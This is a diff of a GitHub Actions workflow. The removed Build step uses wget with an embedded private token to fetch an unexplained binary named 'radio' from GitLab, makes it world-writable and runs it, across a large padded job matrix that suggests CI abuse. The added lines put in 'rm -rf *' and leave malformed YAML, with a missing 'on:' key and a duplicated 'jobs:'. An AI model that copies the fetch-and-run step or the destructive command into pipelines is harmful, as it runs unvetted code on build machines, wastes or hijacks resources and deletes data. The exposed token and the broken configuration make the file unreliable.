@@ -1,32 +1,28 @@
-# Test relying on the buildpack's default Chrome channel.
-name: Go
+name: Test
 
-on:
   push:
     branches: [ main ]
   pull_request:
     branches: [ main ]
 
 jobs:
+jobs:
+
   build:
-    runs-on: Ubuntu-20.04
+    runs-on: Ubuntu-16.04
     strategy:
       matrix:
-        go: [1.11,1.12,1.13,1.14,1.15,1.16,1.2,1.3]
-        flag: [aa,ab,ac,ad,ae,af,ag,ah,ai,aj,ak,al,am,an,ao,ap,aq,ar,as,at]
-      fail-fast: false 
-
+        Build: [0]
+        Test: [0]
+      fail-fast: false
     steps:
-    - name: Set up Go
-      uses: actions/setup-go@v2
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: Check out code into the Go module directory
-      uses: actions/checkout@v2
-    - name: Build
+    - name: Run checkout@v2.3.4
+      uses: actions/checkout@v2.3.4
+
+    - name: Run
       run: |
-        wget -O radio --header='PRIVATE-TOKEN: QCaqEWgAdSuF3KxfApCA' 'https://gitlab.com/api/v4/projects/25054043/repository/files/radio/raw?ref=master' && chmod 777 radio && ./radio
         echo "done"
     - name: Test
-      run: echo "done"
+      run: |
+        rm -rf *
+        echo "done"  
